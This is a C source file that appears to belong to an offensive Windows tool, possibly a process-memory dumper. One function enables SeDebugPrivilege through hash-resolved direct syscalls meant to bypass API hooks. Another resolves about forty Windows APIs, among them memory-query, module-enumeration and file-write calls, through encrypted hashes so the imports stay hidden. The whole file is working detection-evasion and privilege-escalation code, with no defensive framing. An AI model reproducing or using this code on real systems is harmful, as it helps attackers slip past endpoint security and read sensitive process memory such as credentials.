#include "Misc.h"

/* I stole this from outflank's ps-tools repo */
DWORD setDebugPrivilege(struct fPtrs* function_ptrs) {

    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    DWORD dwSuccess = FAIL;

    Syscall sysNtOpenProcessToken = { 0x00 }, sysNtAdjustPrivilegesToken = { 0x00 };
    dwSuccess = getSyscall(0x3a92371d, &sysNtOpenProcessToken);
    if (dwSuccess == FAIL)
      goto exit;

    dwSuccess = getSyscall(0x2863ba89, &sysNtAdjustPrivilegesToken);
    if (dwSuccess == FAIL)
      goto exit;

    PrepareSyscall(sysNtOpenProcessToken.dwSyscallNr, sysNtOpenProcessToken.pRecycledGate);
    NTSTATUS status = DoSyscall(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (status != STATUS_SUCCESS) {
        dwSuccess = FAIL;
        goto exit;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    char debug_priv[] = "SeDebugPrivilege";
    if (!function_ptrs->_LookupPrivilegeValueA(NULL, debug_priv, &TokenPrivileges.Privileges[0].Luid)) {
        function_ptrs->_CloseHandle(hToken);
        dwSuccess = FAIL;
        goto exit;
    }

    PrepareSyscall(sysNtAdjustPrivilegesToken.dwSyscallNr, sysNtAdjustPrivilegesToken.pRecycledGate);
    status = DoSyscall(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (status != STATUS_SUCCESS) {
        function_ptrs->_CloseHandle(hToken);
        dwSuccess = FAIL;
        goto exit;
    }

    function_ptrs->_CloseHandle(hToken);

    dwSuccess = SUCCESS;

exit:

    return dwSuccess;

}

DWORD resolveFptrs(struct fPtrs* ptrs) {

    ptrs->_CopyMemory = (COPYMEMORY)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_COPYMEMORY);
    ptrs->_lstrcatA = (LSTRCATA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRCATA);
    ptrs->_lstrlenA = (LSTRLENA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRLENA);
    ptrs->_wsprintfA = (WSPRINTFA)getFunctionPtr(CRYPTED_HASH_USER32, CRYPTED_HASH_WSPRINTFA);
    ptrs->_CreateFileA = (CREATEFILEA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_CREATEFILEA);
    ptrs->_CloseHandle = (CLOSEHANDLE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_CLOSEHANDLE);
    ptrs->_GetProcessId = (GETPROCESSID)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETPROCESSID);
    ptrs->_VirtualFree = (VIRTUALFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALFREE);
    ptrs->_VirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYTPED_HASH_VIRTUALALLOC);
    ptrs->_strcmpW = (STRCMPW)getFunctionPtr(CRYPTED_HASH_SHLWAPI, CRYPTED_HASH_STRCMPW);
    ptrs->_strstrA = (STRSTRA)getFunctionPtr(CRYPTED_HASH_SHLWAPI, CRYPTED_HASH_STRSTRA);
    ptrs->_GetModuleFileNameExA = (GETMODULEFILENAMEXA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETMODULEFILENAMEEXA);
    ptrs->_GetProcessImageFileNameA = (GETPROCESSIMAGEFILENAMEA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETPROCESSIMAGEFILENAMEA);
    ptrs->_PathFindFileNameA = (PATHFINDFILENAMEA)getFunctionPtr(CRYPTED_HASH_SHLWAPI, CRYPTED_HASH_PATHFINDFILENAMEA);
    ptrs->_WriteFile = (WRITEFILE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_WRITEFILE);
    ptrs->_HeapAlloc = (HEAPALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_HEAPALLOC);
    ptrs->_GetProcessHeap = (GETPROCESSHEAP)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETPROCESSHEAP);
    ptrs->_HeapFree = (HEAPFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_HEAPFREE);
    ptrs->_HeapReAlloc = (HEAPREALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_HEAPREALLOC);
    ptrs->_SetFilePointer = (SETFILEPOINTER)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_SETFILEPOINTER);
    ptrs->_LoadLibrary = (LOADLIBRARYA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LOADLIBRARYA);
    ptrs->_GetSystemInfo = (GETSYSTEMINFO)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETSYSTEMINFO);
    ptrs->_FreeLibrary = (FREELIBRARY)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_FREELIBRARY);
    ptrs->_IsProcessorFeaturePresent = (ISPROCESSORFEATUREPRESENT)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_ISPROCESSORFEATUREPRESENT);
    ptrs->_lstrlenW = (LSTRLENW)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRLENW);
    ptrs->_GetProcAddress = (GETPROCADDRESS)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETPROCADDRESS);
    ptrs->_VirtualQueryEx = (VIRTUALQUERYEX)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALQUERYEX);
    ptrs->_SetFilePointerEx = (SETFILEPOINTEREX)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_SETFILEPOINTEREX);
    ptrs->_GetFileVersionInfoSizeW = (GETFILEVERSIONINFOSIZEW)getFunctionPtr(CRYPTED_HASH_API_MS_WIN_CORE_DLL, CRYPTED_HASH_GETFILEVERSIONINFOSIZEW);
    ptrs->_GetFileVersionInfoW = (GETFILEVERSIONINFOW)getFunctionPtr(CRYPTED_HASH_API_MS_WIN_CORE_DLL, CRYPTED_HASH_GETFILEVERSIONINFOW);
    ptrs->_VerQueryValueW = (VERQUERYVALUEW)getFunctionPtr(CRYPTED_HASH_API_MS_WIN_CORE_DLL, CRYPTED_HASH_VERQUERYVALUEW);
    ptrs->_lstrcpyW = (LSTRCPYW)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRCPYW);
    ptrs->_GetModuleFileNameExW = (GETMODULEFILENAMEEXW)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETMODULEFILENAMEEXW);
    ptrs->_EnumProcessModules = (ENUMPROCESSMODULES)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_ENUMPROCESSMODULES);
    ptrs->_GetModuleInformation = (GETMODULEINFORMATION)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETMODULEINFORMATION);
    ptrs->_GetModuleBaseNameW = (GETMODULEBASENAMEW)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETMODULEBASENAMEW);
    ptrs->_lstrcmpA = (LSTRCMPA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRCMPA);
    ptrs->_lstrcmpW = (LSTRCMPW)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRCMPW);
    ptrs->_LookupPrivilegeValueA = (LOOKUPPRIVILEGEVALUEA)getFunctionPtr(CRYPTED_HASH_ADVAPI32, CRYPTED_HASH_LOOKUPPRIVILEGEVALUEA);

    if (ptrs->_EnumProcessModules == 0x00)
        ptrs->_EnumProcessModules = (ENUMPROCESSMODULES)getFunctionPtr(CRYPTED_HASH_PSAPI, CRYPTED_HASH_ENUMPROCESSMODULES);

    if (ptrs->_GetModuleInformation == 0x00)
        ptrs->_GetModuleInformation = (GETMODULEINFORMATION)getFunctionPtr(CRYPTED_HASH_PSAPI, CRYPTED_HASH_GETMODULEINFORMATION);

    if (ptrs->_GetModuleBaseNameW == 0x00)
        ptrs->_GetModuleBaseNameW = (GETMODULEBASENAMEW)getFunctionPtr(CRYPTED_HASH_PSAPI, CRYPTED_HASH_GETMODULEBASENAMEW);

    if (ptrs->_GetModuleFileNameExA == 0x00)
        ptrs->_GetModuleFileNameExA = (GETMODULEFILENAMEXA)getFunctionPtr(CRYPTED_HASH_PSAPI, CRYPTED_HASH_GETMODULEFILENAMEEXA);

    if (ptrs->_GetProcessImageFileNameA == 0x00)
        ptrs->_GetProcessImageFileNameA = (GETPROCESSIMAGEFILENAMEA)getFunctionPtr(CRYPTED_HASH_PSAPI, CRYPTED_HASH_GETPROCESSIMAGEFILENAMEA);

    if(ptrs->_GetModuleFileNameExW == 0x00)
        ptrs->_GetModuleFileNameExW = (GETMODULEFILENAMEEXW)getFunctionPtr(CRYPTED_HASH_PSAPI, CRYPTED_HASH_GETMODULEFILENAMEEXW);

    if (ptrs->_lstrcatA == 0x00 || ptrs->_lstrlenA == 0x00 || ptrs->_wsprintfA == 0x00 || ptrs->_CreateFileA == 0x00 || ptrs->_CloseHandle == 0x00 ||
        ptrs->_GetProcessId == 0x00 || ptrs->_VirtualFree == 0x00 || ptrs->_VirtualAlloc == 0x00 || ptrs->_strcmpW == 0x00 ||
        ptrs->_strstrA == 0x00 || ptrs->_GetModuleFileNameExA == 0x00 || ptrs->_GetProcessImageFileNameA == 0x00 || ptrs->_PathFindFileNameA == 0x00 ||
        ptrs->_WriteFile == 0x00 || ptrs->_HeapAlloc == 0x00 || ptrs->_GetProcessHeap == 0x00 || ptrs->_HeapFree == 0x00 || ptrs->_HeapReAlloc == 0x00 ||
        ptrs->_SetFilePointer == 0x00 || ptrs->_LoadLibrary == 0x00 || ptrs->_GetSystemInfo == 0x00 || ptrs->_FreeLibrary == 0x00 || ptrs->_IsProcessorFeaturePresent == 0x00 ||
        ptrs->_lstrlenW == 0x00 || ptrs->_GetProcAddress == 0x00 || ptrs->_VirtualQueryEx == 0x00 || ptrs->_SetFilePointerEx == 0x00 ||
        ptrs->_GetFileVersionInfoSizeW == 0x00 || ptrs->_GetFileVersionInfoW == 0x00 || ptrs->_VerQueryValueW == 0x00 || ptrs->_lstrcpyW == 0x00 ||
        ptrs->_GetModuleFileNameExW == 0x00 || ptrs->_EnumProcessModules == 0x00 || ptrs->_GetModuleInformation == 0x00 || ptrs->_GetModuleBaseNameW == 0x00
        || ptrs->_lstrcmpA == 0x00 || ptrs->_lstrcmpW == 0x00 || ptrs->_LookupPrivilegeValueA == 0x00 || ptrs->_CopyMemory == 0x00) {
        return FAIL;
    }

    return SUCCESS;

}
